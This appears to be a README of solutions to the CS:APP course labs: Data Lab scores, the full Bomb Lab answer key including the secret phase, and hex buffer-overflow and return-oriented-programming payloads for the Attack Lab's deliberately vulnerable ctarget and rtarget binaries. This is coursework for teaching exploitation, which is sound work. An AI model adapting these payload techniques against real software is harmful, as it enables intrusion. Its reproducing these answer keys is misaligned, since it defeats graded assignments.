# CSAPP-Labs

## Current Status
- [x] Data Lab
- [x] Bomb Lab
- [x] Attack Lab

## Data Lab
| Points | Rating | Errors | Points | Ops |    Puzzle    |
| ------ | ------ | ------ | ------ | --- |    ------    |
|    1   |    1   |    0   |    2   |  8  |    bitXor    |
|    1   |    1   |    0   |    2   |  1  |     tmin     |
|    1   |    1   |    0   |    2   |  8  |    isTmax    |
|    2   |    2   |    0   |    2   |  7  |  allOddBits  |
|    2   |    2   |    0   |    2   |  2  |    negate    |
|    3   |    3   |    0   |    2   |  8  | isAsciiDigit |
|    3   |    3   |    0   |    2   |  7  |  conditional |
|    3   |    3   |    0   |    2   |  16 | isLessOrEqual|
|    4   |    4   |    0   |    2   |  8  |  logicalNeg  |
|    4   |    4   |    0   |    2   |  56 |  howManyBits |
|    4   |    4   |    0   |    2   |  8  |  floatScale2 |
|    4   |    4   |    0   |    2   |  15 |floatFloat2Int|
|    4   |    4   |    0   |    2   |  8  |  floatPower2 |

Score = 62/62 [36/36 Corr + 26/26 Perf] (152 total operators)

**Tip :** change the TIMEOUT_LIMIT in btest.c from 10 to 20 so that floatPower2 can pass.

## Bomb Lab
|   func    | answer |
| --------- | ------ |
| <phase_1> | Border relations with Canada have never been better. |
| <phase_2> | 1 2 4 8 16 32 |
| <phase_3> | 0 207 |
|           | 1 311 |
|           | 2 707 |
|           | 3 256 |
|           | 4 389 |
|           | 5 206 |
|           | 6 682 |
|           | 7 327 |
| <phase_4> | 7 0 |
|           | 3 0 |
|           | 1 0 |
|           | 0 0 |
| <phase_5> | ionefg |
|           | ionefw |
|           | ionevg |
|           | ionevw |
|           | ionufg |
|           | ionufw |
|           | ionuvg |
|           | ionuvw |
|           | yonefg |
|           | yonefw |
|           | yonevg |
|           | yonevw |
|           | yonufg |
|           | yonufw |
|           | yonuvg |
|           | yonuvw |
| <phase_6> | 4 3 2 1 6 5 |
| <secret_phase> | 22 |

To get into `<secret_phase>`, add "DrEvil" at the end in `<phase_4>`.

## Attack Lab
| target | answer |
| ------ | ------ |
| ctarget_level1 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00 |
| ctarget_level2 | 48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 |
| ctarget_level3 | 48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00 |
| rtarget_level2 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ab 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 a2 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00 |
| rtarget_level3 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1a 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 ab 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 dd 19 40 00 00 00 00 00 70 1a 40 00 00 00 00 00 13 1a 40 00 00 00 00 00 d6 19 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 fa 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00 |